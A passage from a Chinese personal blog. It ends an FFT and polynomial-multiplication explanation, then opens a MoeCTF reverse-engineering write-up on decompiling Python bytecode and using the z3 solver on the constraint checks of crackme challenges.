<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)&#123;<span class="comment">//一定注意此处上界是n/2</span></span><br><span class="line">    y[i]	=y0[i]+<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//容易理解</span></span><br><span class="line">   	y[n/<span class="number">2</span>+i]=y0[i]-<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//想对困难</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每次递归都将工程量缩减一半,因此总工程量直接对n取对数 <span
class="math display">\[
T(n)=2T(\frac{n}{2})+\Theta(n)=\Theta(n\lg n)
\]</span></p>
<p>好了到此FFT的思路有了,求值结束,也就是我们求得了<span
class="math inline">\(y=DFT(a)\)</span></p>
<blockquote>
<p>举个例子,<span
class="math inline">\(A(x)=1+2x+x^2+x^3\)</span>,正好有<span
class="math inline">\(2^2=4\)</span>项,n=4</p>
<p>4次单位复根<span class="math inline">\(\omega_4^k=e^{\frac{2\pi
ik}{4}}\)</span></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FFT(&lt;1,2,1,1&gt;)&#123;</span><br><span class="line">	n=&lt;1,2,1,1&gt;.length()=4;</span><br><span class="line">	a0=&lt;1,1&gt;;</span><br><span class="line">	a1=&lt;2,1&gt;;</span><br><span class="line">	w1;</span><br><span class="line">	y0=FFT(&lt;1,1&gt;)&#123;</span><br><span class="line">		n=&lt;1,1&gt;.length()=2;</span><br><span class="line">		a0=&lt;1&gt;;</span><br><span class="line">		a1=&lt;1&gt;;</span><br><span class="line">		y0=FFT(&lt;1&gt;)=&lt;1&gt;;</span><br><span class="line">		y1=FFT(&lt;1&gt;)=&lt;1&gt;;</span><br><span class="line">		y[0]=y[0]+w1</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>下面考虑如何从点值形式倒回去,也就是如何在<span
class="math inline">\(O(n\lg n)\)</span>实现插值</p>
<p>现在已知的是<span class="math inline">\(\vec{y}\)</span>和<span
class="math inline">\(\vec{x}=\{\omega_{n}^0,\omega_n^1,...,\omega_n^{n-1}\}\)</span>,求系数向量<span
class="math inline">\(\vec{a}\)</span></p>
<p>显然可以待定系数法设n个系数,然后带入自变量和因变量,解一元n次方程组.</p>
<p>高斯消元法是<span
class="math inline">\(O(n^2)\)</span>的lowB算法,要用吊算法</p>
<p>写成矩阵形式</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219211357315.png"
alt="image-20221219211357315" />
<figcaption aria-hidden="true">image-20221219211357315</figcaption>
</figure>
<p>也就是说,一眼顶针,鉴定为范德蒙矩阵,必然可逆且逆矩阵唯一</p>
<p>现在要用尽可能快的方法求解这个范德蒙矩阵<span
class="math inline">\(V\)</span>的逆矩阵,这个求解方法就是算法关键</p>
<p>这有个定理<span
class="math inline">\(V^{-1}_n[j,k]=\frac{\omega_n^{-kj}}{n}\)</span></p>
<p>怎么得出来的,我线性代数忘了,不会解,但是<span
class="math inline">\(VV^{-1}\)</span>算一下确实得到<span
class="math inline">\(E\)</span>,满足互逆矩阵的定义</p>
<p>由于<span class="math inline">\(\vec{a}=\vec
V^{-1}\vec{y}\)</span></p>
<p><span class="math inline">\(a_j\)</span>就等于<span
class="math inline">\(\vec V^{-1}\)</span>的第j行与<span
class="math inline">\(\vec y\)</span>的乘积,也就是说 <span
class="math display">\[
a_j=\sum_{k=0}^{n-1}V_n^{-1}[j,k]\times y_k\\
=\sum_{k=0}^{n-1}\frac{\omega^{-kj}_n}{n}\times y_k\\
=\frac{1}{n}\sum_{k=0}^{n-1}\omega_n^{-kj}\times y_k
\]</span> 求解一个<span class="math inline">\(a_j\)</span>,是<span
class="math inline">\(O(n)\)</span>复杂度的,</p>
<p>共有n个<span class="math inline">\(a_j\)</span>,总共就是<span
class="math inline">\(O(n^2)\)</span>复杂度的,怎么降到<span
class="math inline">\(O(n\lg n)\)</span>呢?</p>
<p>回忆正向的FFT是干啥的来着</p>
<p>是求解<span class="math inline">\(\vec{y}=DFT_n(\vec
{a})\)</span>问题的</p>
<p>其中<span
class="math inline">\(y_j=\sum_{k=0}^{n-1}a_j\omega_n^{jk}\)</span></p>
<p>类比一下 <span class="math display">\[
\begin{aligned}
n a_j&amp;=\sum_{k=0}^{n-1} y_k\omega_n^{-jk}\\
y_j&amp;=\sum_{k=0}^{n-1}a_k\omega_n^{jk}
\end{aligned}
\]</span> 令<span
class="math inline">\(\vec{y&#39;}=n\vec{a},\)</span></p>
<p><span class="math inline">\(\vec{a&#39;}=\vec{y}\)</span></p>
<p>令单位富哥变成单位负哥,就可以直接带入FFT函数求解了<span
class="math inline">\(\vec{y&#39;}\)</span>了</p>
<p>解出来都除以n就得到了<span class="math inline">\(\vec{a}\)</span></p>
<p>因此又在<span class="math inline">\(O(n\lg n)\)</span>内解决了</p>
<h2 id="回到多项式求积">回到多项式求积</h2>
<p>卷积定理:</p>
<p>对于两个长度为n的向量<span class="math inline">\(\vec a,\vec
b\)</span> <span class="math display">\[
a\otimes b=DFT^{-1}_{2n}(DFT_{2n}(a)·DFT_{2n}(b))
\]</span> 将多项式A,B只保留系数看成向量a,b,此时<span
class="math inline">\(a\otimes b\)</span>就是积多项式AB的系数向量</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/11/11/moectf%E8%A1%A5%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/11/moectf%E8%A1%A5%E9%A2%98/" class="post-title-link" itemprop="url">moectf补题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-11 11:36:00" itemprop="dateCreated datePublished" datetime="2022-11-11T11:36:00+08:00">2022-11-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-07-05 13:16:14" itemprop="dateModified" datetime="2024-07-05T13:16:14+08:00">2024-07-05</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="moectf补题">moectf补题</h1>
<p><a target="_blank" rel="noopener" href="https://github.com/XDSEC/moeCTF_2022">XDSEC/MoeCTF_2022:
MoeCTF 2022 Challenges and Writeups (github.com)</a></p>
<h2 id="reverse">reverse</h2>
<h3 id="equationpy">EquationPy</h3>
<p>python逆向</p>
<h4 id="pyc与py">pyc与py</h4>
<p>在写数据库上机作业时,已经遇见过pyc文件了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├─admin</span><br><span class="line">│  │  admin.py</span><br><span class="line">│  │  __init__.py</span><br><span class="line">│  │</span><br><span class="line">│  └─__pycache__</span><br><span class="line">│          admin.cpython-38.pyc</span><br><span class="line">│          __init__.cpython-38.pyc</span><br></pre></td></tr></table></figure>
<p>所有pyc文件都放到<code>__pycache__</code>目录下面,且pyc文件都是和其父目录中的py文件一一对应的</p>
<p>比如这里admin.py对应到admin.cpython-38.pyc</p>
<p>既然cache是缓存的意思,那么可以推测,pyc是py文件编译形成的,用来加速运行的.因为直接运行编译好的二进制文件必然比解释运行py源文件快</p>
<p>查阅资料:</p>
<blockquote>
<p>pyc是一种二进制文件，是由py文件经过编译后，生成的文件，是一种byte
code，py文件变成pyc文件后，加载的速度有所提高，而且pyc是一种跨平台的字节码，是由python的虚拟机来执行的，这个是类似于JAVA或者.NET的虚拟机的概念。pyc的内容，是跟python的版本相关的，不同版本编译后的pyc文件是不同的，3.7编译的pyc文件，3.6版本的
python是无法执行的。</p>
</blockquote>
<h4 id="python命令行编译">python命令行编译</h4>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m py_compile main.py</span><br></pre></td></tr></table></figure>
<p>这条命令执行之后就会在当前目录下生成一个子目录<code>__pycache__</code>,其中就有main.cpython-38.pyc文件</p>
<p>这个玩意儿长啥样?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110123037633.png"
alt="image-20221110123037633" />
<figcaption aria-hidden="true">image-20221110123037633</figcaption>
</figure>
<h4 id="反编译">反编译</h4>
<p>可以使用<a target="_blank" rel="noopener" href="https://tool.lu/pyc/">在线网站</a>反编译</p>
<p>也可以使用uncompyle6反编译,但是在我电脑上直接卡死</p>
<p>用在线网站反编译之后得到的是一个</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Maybe z3 can help you solve this challenge.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Now give me your flag, and I will check for you.&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Input your flag:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">22</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">7072</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">2523</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6714</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">8810</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">6796</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">2647</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">1347</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">1289</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">8917</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">2304</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">5001</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">2882</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">7232</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">3192</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9676</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">5436</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4407</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">6269</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">9623</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">6230</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">6292</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">57</span> == <span class="number">10743134</span> <span class="keyword">and</span> ...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">5926</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9095</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">2048</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4639</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">3035</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9560</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">1591</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">2392</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">1812</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">6732</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">9454</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">8175</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">7346</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">6333</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9812</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">2034</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">6634</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">1762</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7058</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">3524</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">7462</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">11</span> == <span class="number">11118093</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Congratulate!!!You are right!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;What a pity...Please try again &gt;__&lt;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>中间省去了一大段约束条件,因为没有缩进,格式很乱,可以在一个and上ctrl+f2选择所有and,然后移动光标到and最后按回车,相对于刚才稍微明朗点了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110161830590.png"
alt="image-20221110161830590" />
<figcaption aria-hidden="true">image-20221110161830590</figcaption>
</figure>
<p>实际上整个是一个22元一次方程组,怎么解这个方程组呢?z3</p>
<h4 id="z3模块">Z3模块</h4>
<p>z3用于在约束条件下求一组解</p>
<h5 id="python安装z3模块">python安装z3模块</h5>
<p>官网<a target="_blank" rel="noopener" href="https://pypi.org/project/z3-solver/">z3-solver ·
PyPI</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure>
<p>之后就可以在python中使用了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
<h5 id="使用">使用</h5>
<p><a target="_blank" rel="noopener" href="https://blog.shi1011.cn/learn/1789">从CTF入门z3 solver -
翻车鱼 (shi1011.cn)</a></p>
<p>[<a
target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-266921.htm">原创]Z3求解约束器及例题-CTF对抗-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
<p><a
target="_blank" rel="noopener" href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">Z3Py
Guide (ericpony.github.io)</a></p>
<p><a
target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1423409">Z3简介及在逆向领域的应用
- 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<h5 id="基本类型">基本类型</h5>
<table>
<thead>
<tr>
<th>Z3类型</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>Int</td>
<td>整数</td>
</tr>
<tr>
<td>Bool</td>
<td>布尔</td>
</tr>
<tr>
<td>Array</td>
<td>数组</td>
</tr>
<tr>
<td>BitVec</td>
<td>位域</td>
</tr>
<tr>
<td>Real</td>
<td>实数</td>
</tr>
</tbody>
</table>
<h5 id="基本语句">基本语句</h5>
<table>
<thead>
<tr>
<th>基本语句</th>
<th>意义</th>
<th>例子</th>
</tr>
</thead>
<tbody>
<tr>
<td>Solver</td>
<td>创建一个求解器,可以添加约束条件</td>
<td>s=Solver()</td>
</tr>
<tr>
<td>add</td>
<td>添加约束条件</td>
<td></td>
</tr>
<tr>
<td>check</td>
<td>检查在给定约束条件下是否有解</td>
<td></td>
</tr>
<tr>
<td>model</td>
<td>求出满足所有约束条件的一个解</td>
<td></td>
</tr>
</tbody>
</table>
<p>比如想要求解椭圆<span
class="math inline">\(\frac{x^2}{25}+\frac{y^2}{16}=1\)</span>与直线<span
class="math inline">\(y=x-1\)</span>在y轴右侧的一个焦点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x=Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y=Real(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(x*x/<span class="number">25</span>+y*y/<span class="number">16</span>==<span class="number">1</span>)<span class="comment">#约束椭圆方程</span></span><br><span class="line">s.add(y==x-<span class="number">1</span>)<span class="comment">#约束直线方程</span></span><br><span class="line">s.add(x&gt;<span class="number">0</span>)<span class="comment">#约束y轴右侧</span></span><br><span class="line"><span class="keyword">if</span>(s.check()==sat):</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x = 3.6949050343?, y = 2.6949050343?]</span><br></pre></td></tr></table></figure>
<h5 id="iscc-2018-reverse-my-math-is-bad">ISCC-2018 reverse-My math is
bad</h5>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=======================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;= Welcome to the flag access machine! =&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=   Input the password to login ...   =&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=======================================&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)check() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You should get the flag...&quot;</span>);</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong password!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>全局位置有一个字符串input,首先check会检查input,如果通过,则调用flag函数给出flag,其中check和flag中都有加密</p>
<p>这个输入的字符串input在bss节[0x6020A0,0x6020C0)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221002154256280.png"
alt="image-20221002154256280" />
<figcaption aria-hidden="true">image-20221002154256280</figcaption>
</figure>
<p><strong>check</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-48h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+50h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+60h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+70h] [rbp-10h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 要求input长32个字节</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v1 = unk_6020B0;                              <span class="comment">// 0x30303030</span></span><br><span class="line">  v2 = unk_6020B4;</span><br><span class="line">  v3 = unk_6020B8;</span><br><span class="line">  v4 = unk_6020BC;</span><br><span class="line">  <span class="comment">// 约束条件1</span></span><br><span class="line">  <span class="keyword">if</span> ( dword_6020A4 * (__int64)*(<span class="type">int</span> *)input - dword_6020AC * (__int64)dword_6020A8 != <span class="number">0x24CDF2E7C953DA56</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  <span class="comment">// 约束条件2</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3LL</span> * dword_6020A8 + <span class="number">4LL</span> * dword_6020AC - dword_6020A4 - <span class="number">2LL</span> * *(<span class="type">int</span> *)input != <span class="number">0x17B85F06</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  <span class="comment">// 约束条件3</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3</span> * *(<span class="type">int</span> *)input * (__int64)dword_6020AC - dword_6020A8 * (__int64)dword_6020A4 != <span class="number">0x2E6E497E6415CF3E</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  <span class="comment">// 约束条件4</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">27LL</span> * dword_6020A4 + *(<span class="type">int</span> *)input - <span class="number">11LL</span> * dword_6020AC - dword_6020A8 != <span class="number">0x95AE13337</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  srand(dword_6020A8 ^ dword_6020A4 ^ *(_DWORD *)input ^ dword_6020AC);</span><br><span class="line">  v5 = rand() % <span class="number">50</span>;</span><br><span class="line">  v6 = rand() % <span class="number">50</span>;</span><br><span class="line">  v7 = rand() % <span class="number">50</span>;</span><br><span class="line">  v8 = rand() % <span class="number">50</span>;</span><br><span class="line">  v9 = rand() % <span class="number">50</span>;</span><br><span class="line">  v10 = rand() % <span class="number">50</span>;</span><br><span class="line">  v11 = rand() % <span class="number">50</span>;</span><br><span class="line">  v12 = rand() % <span class="number">50</span>;</span><br><span class="line">  <span class="comment">// 约束条件5</span></span><br><span class="line">  <span class="keyword">if</span> ( v4 * v6 + v1 * v5 - v2 - v3 != <span class="number">0xE638C96D3</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  <span class="comment">// 约束条件6,7,8</span></span><br><span class="line">  <span class="keyword">if</span> ( v4 + v1 + v3 * v8 - v2 * v7 == <span class="number">0xB59F2D0CB</span>LL</span><br><span class="line">    &amp;&amp; v1 * v9 + v2 * v10 - v3 - v4 == <span class="number">0xDCFE88C6D</span>LL</span><br><span class="line">    &amp;&amp; v3 * v12 + v1 - v2 - v4 * v11 == <span class="number">0xC076D98BB</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前四个约束条件组成方程组可以确定输入的前四个双字,</p>
<p>后面的srand种子就是前四个双字的异或,也可以确定了,然后产生的v5~v12随机数也可以确定了,</p>
<p>下面的运算又可以根据四个约束条件确定后四个双字</p>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221002153303248.png" /></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_6020A4 * (__int64)*(<span class="type">int</span> *)input - dword_6020AC * (__int64)dword_6020A8 != <span class="number">0x24CDF2E7C953DA56</span>LL )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_12;</span><br></pre></td></tr></table></figure>
<p>第一个双字和第二个双字的积减去第三个双字和第四个双字的积得是0x24CDF2E7C953DA56</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 约束条件2</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="number">3LL</span> * dword_6020A8 + <span class="number">4LL</span> * dword_6020AC - dword_6020A4 - <span class="number">2LL</span> * *(<span class="type">int</span> *)input != <span class="number">0x17B85F06</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_12;</span><br></pre></td></tr></table></figure>
<p><span class="math display">\[
(3*input[8:11]+4*input[12:15])-(1*input[4:7]+2*input[0:3])=17B85F06h
\]</span></p>
<p>前四个约束条件就可以写成:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword0*dword1-dword2*dword3==0x24CDF2E7C953DA56</span><br><span class="line">(3*dword2+4*dword3)-(1*dword1+2*dword0)==0x17B85F06</span><br><span class="line">3*dword0*dword3-dword2*dword1==0x2E6E497E6415CF3E</span><br><span class="line">(27*dword1+dword0)-(11*dword3+dword2)==0x95AE13337</span><br></pre></td></tr></table></figure>
<p>写z3脚本解方程</p>
